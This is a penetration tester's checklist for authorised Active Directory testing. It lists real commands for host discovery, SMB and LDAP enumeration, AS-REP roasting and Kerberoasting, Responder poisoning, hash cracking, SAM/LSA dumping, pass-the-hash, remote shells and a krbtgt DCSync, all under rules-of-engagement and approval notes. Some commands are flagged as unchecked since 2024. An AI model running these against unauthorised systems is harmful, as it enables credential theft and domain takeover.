# Active Directory / Internal Network Run Sheet

> Before each step, check the ROE. Spraying, poisoning, and relay can be restricted or disruptive.
> Variables: `$DC` = domain controller IP, `$D` = domain, `$U`/`$P` = current credential.

> Risk key (same as `playbooks/README.md`): 🟢 Safe / 🟡 Noisy / 🔴 Risky / Prohibited. Steps without a label are not rated here; the Recon Field Guide rates the discovery commands.

> Impacket tools are named `impacket-<tool>` on Kali (e.g. `impacket-GetNPUsers`). If Impacket was installed with pip or pipx instead, the names end in `.py`. Commands marked **(sudo)** need root.

## 1. Discovery (no creds)
- [ ] **(sudo)** Host discovery on in-scope ranges only, using four sweeps so hosts that drop one probe type still show up:
    - ICMP echo: `nmap -sn -n -PE -iL scope.txt --excludefile exclude.txt -oA disc-icmp`
    - TCP SYN: `nmap -sn -n -PS22,80,135,443,445,3389 -iL scope.txt --excludefile exclude.txt -oA disc-syn`
    - TCP ACK: `nmap -sn -n -PA22,80,443,3389 -iL scope.txt --excludefile exclude.txt -oA disc-ack`
    - ARP (only on a subnet we sit on directly): `nmap -sn -n -PR -iL scope.txt --excludefile exclude.txt -oA disc-arp`
    - `exclude.txt` holds the SOW exclusions plus every OT host found (tag each OT host `# OT`, see the OT sheet). Why `-n` and the one name lookup: Recon Field Guide 1.7.
    - Merge: `cat disc-*.gnmap | awk '/Up$/{print $2}' | sort -uV > live.txt`
- [ ] 🟡 Noisy. Service scan, **claimed, non-OT hosts only** (one host at a time, said aloud first): `nmap -n -sC -sV <host> -oA svc --excludefile exclude.txt --exclude-ports <brittle ports>`. The full `--exclude-ports` string is in the OT sheet; never run `-sC`/`-sV` against OT. First pass over the whole live list: top 100 ports only (Recon Field Guide 1.7, step 5). (playbooks: playbooks/windows/03-smbv1-enabled.md, playbooks/windows/21-upgrade-systems.md)
- [ ] 🟢 Safe. Find the DCs (ports 88, 389, 445, 636): `nxc smb <hostlist>` shows domain, hostname, and SMB signing (playbook: playbooks/windows/04-smb-signing-not-required.md)
- [ ] 🟢 Safe. Relay target list: `nxc smb <hostlist> --gen-relay-list relay.txt` (hosts without SMB signing = **finding**) (playbook: playbooks/windows/04-smb-signing-not-required.md)
- [ ] 🟡 Noisy. Null/guest sessions: `nxc smb $DC -u '' -p '' --shares` and `nxc smb $DC -u 'guest' -p '' --shares` (playbook: playbooks/windows/02-default-guest-admin-no-password.md)
- [ ] 🟡 Noisy. Anonymous LDAP: `nxc ldap $DC -u '' -p '' --users` (playbook: playbooks/windows/01-credentials-in-ldap.md)

## Known vulnerability checks (checks only: the exploit needs approval every time)
- [ ] 🟢 Safe / 🔴 Risky. PrintNightmare: `impacket-rpcdump <TARGET_IP> | egrep 'MS-RPRN|MS-PAR'` [[NOTE: from 2024, not yet checked]]. Check only; the exploit needs approval every time. (playbook: playbooks/windows/05-printnightmare.md)
- [ ] 🟡 Noisy / Prohibited. ZeroLogon, DCs only: `enum4linux <TARGET_IP>` for the DC's NetBIOS name [[NOTE: from 2024, not yet checked]], then `python3 zerologon_tester.py <NETBIOS_DC_NAME> <TARGET_IP>` [[NOTE: from 2024, not yet checked]]. Tester only; the exploit is **Prohibited** (it breaks the domain). (playbook: playbooks/windows/06-zerologon.md)
- [ ] 🟡 Noisy / 🔴 Risky. PetitPotam (needs a domain login): check whether the DC can be coerced. Check only; the relay needs approval every time, and only if the ROE allows relaying. (playbook: playbooks/windows/08-petitpotam.md)
- [ ] 🟢 Safe / 🔴 Risky. EternalBlue: `nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>` [[NOTE: from 2024, not yet checked]]. Check only; the exploit needs approval every time. (playbook: playbooks/windows/09-eternalblue.md)
- [ ] 🟢 Safe / 🔴 Risky. NoPac (needs a domain login): check the DCs. Check only; the exploit needs approval every time. (playbook: playbooks/windows/23-nopac.md)

## 2. First credential
- [ ] 🟢 Safe. **Password policy first:** `nxc smb $DC -u $U -p $P --pass-pol` (note the lockout threshold and window). Before you have a credential, try the null session (🟡 Noisy): `nxc smb $DC -u '' -p '' --pass-pol` (playbook: playbooks/windows/26-password-policy.md)
- [ ] 🟡 Noisy. AS-REP roast (works without a password if you have usernames; build `users.txt`, one name per line, from the anonymous LDAP or RID-cycling output above, or from names found on public pages): `impacket-GetNPUsers $D/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt` (playbook: playbooks/windows/07-asrep-roasting.md)
- [ ] **(sudo)** Poisoning, **only if the ROE allows**: `sudo responder -I <iface> -A` (analyze mode) first, then full mode only if permitted
- [ ] Spraying: **at most (threshold − 2) attempts per observation window**, logged with timestamps

## 3. Authenticated enumeration
- [ ] 🟢 Safe. Users, groups, and descriptions (passwords in descriptions are a classic): `nxc ldap $DC -u $U -p $P --users` (playbook: playbooks/windows/13-secrets-in-ad-comments.md)
- [ ] 🟢 Safe / 🔴 Risky. Shares: `nxc smb <range> -u $U -p $P --shares` → look in readable shares for scripts, configs, and backups (playbooks: playbooks/general/01-access-and-identity-data.md, playbooks/ot/05-ot-files-on-shares.md)
- [ ] 🟡 Noisy. BloodHound: `bloodhound-python -d $D -u $U -p $P -ns $DC -c All --zip`, then mark owned principals and run shortest paths (playbooks: playbooks/windows/17-misconfigured-privileges.md, playbooks/windows/15-workstation-accounts-admin.md)
- [ ] 🟡 Noisy. Kerberoast: `impacket-GetUserSPNs $D/$U:$P -dc-ip $DC -request -outputfile kerb.txt` (playbook: playbooks/windows/25-kerberoasting.md)
- [ ] ADCS: `certipy find -u $U@$D -p $P -dc-ip $DC -vulnerable -stdout`
- [ ] 🟡 Noisy. Where can this credential log in? `nxc smb <range> -u $U -p $P`, `nxc winrm <range> -u $U -p $P` (`Pwn3d!` = local admin) (playbook: playbooks/general/02-pivoting-and-trust-boundaries.md)

## 4. Escalation and movement
- [ ] Crack hashes offline: `hashcat -m 13100 kerb.txt` (TGS), `-m 18200` (AS-REP), `-m 5600` (NetNTLMv2)
- [ ] 🟡 Noisy. Reuse every new credential across all hosts (credential reuse = **finding**) (playbook: playbooks/general/02-pivoting-and-trust-boundaries.md)
- [ ] Local admin hashes: `nxc smb <host> -u <admin> -p <P> --sam` / `--lsa`
- [ ] 🟡 Noisy. Pass-the-hash: `nxc smb <range> -u <user> -H <NThash>` (playbook: playbooks/general/02-pivoting-and-trust-boundaries.md)
- [ ] 🔴 Risky. Shells: `evil-winrm -i <host> -u <user> -p <P>` / `impacket-wmiexec` (psexec is the noisiest and creates a service) (playbook: playbooks/general/02-pivoting-and-trust-boundaries.md)
- [ ] 🔴 Risky. ACL abuse paths from BloodHound (GenericAll, WriteDACL, ForceChangePassword). **Record every change you make so you can report and revert it.** (playbook: playbooks/windows/17-misconfigured-privileges.md)
- [ ] 🔴 Risky. Juicy Potato: a service account with the impersonation right on an old Windows build can escalate to SYSTEM. Approval every time; record every file dropped and remove it afterwards. (playbook: playbooks/windows/22-juicy-potato.md)

## Host hygiene (note it for the report)
- [ ] 🟢 Safe. Hacking tools already on a host (not ours): note them. (playbook: playbooks/windows/10-hacking-tools-present.md)
- [ ] 🟢 Safe. Firewall off: open `Windows Defender Firewall` from Windows Search; state off = finding [[NOTE: from 2024, not yet checked]] (playbook: playbooks/windows/11-firewall-disabled.md)
- [ ] 🟢 Safe. Real-time protection off: open `Windows Security` from Windows Search, check `Virus and threat protection` [[NOTE: from 2024, not yet checked]] (playbook: playbooks/windows/12-real-time-protection-disabled.md)
- [ ] 🟢 Safe. Vendor machines joined to the domain: in `Active Directory Users and Computers (ADUC)`, look in `Computers` and the OUs [[NOTE: from 2024, not yet checked]] (playbook: playbooks/windows/14-vendors-domain-joined.md)
- [ ] 🟢 Safe. Internet Explorer still enabled: `Run -> optionalfeatures` [[NOTE: from 2024, not yet checked]] (playbook: playbooks/windows/16-internet-explorer-enabled.md)
- [ ] 🟢 Safe / 🔴 Risky. Any user can add workstations to the domain: read `Add workstations to domain` in the `Default Domain Controllers Policy` (`Run -> gpmc.msc`) [[NOTE: from 2024, not yet checked]]. Read only; adding a computer is 🔴 Risky. (playbook: playbooks/windows/19-users-can-add-workstations.md)
- [ ] 🟢 Safe / 🔴 Risky. Shutdown without login: in `gpedit`, `Security Options`, check `Shutdown: Allow the system to be shutdown without having to log on` [[NOTE: from 2024, not yet checked]]. **Never click shut down.** (playbook: playbooks/windows/20-shutdown-without-login.md)

## 5. Domain compromise (prove it, don't wreck it)
- [ ] DCSync with an account that has the rights: `impacket-secretsdump $D/<user>:<P>@$DC -just-dc-user krbtgt`
- [ ] Screenshot proof, then **stop**. Record exactly what you touched for cleanup.

## Evidence for every step
Timestamped command + output + screenshot → `evidence/F-XXX-NN.png`
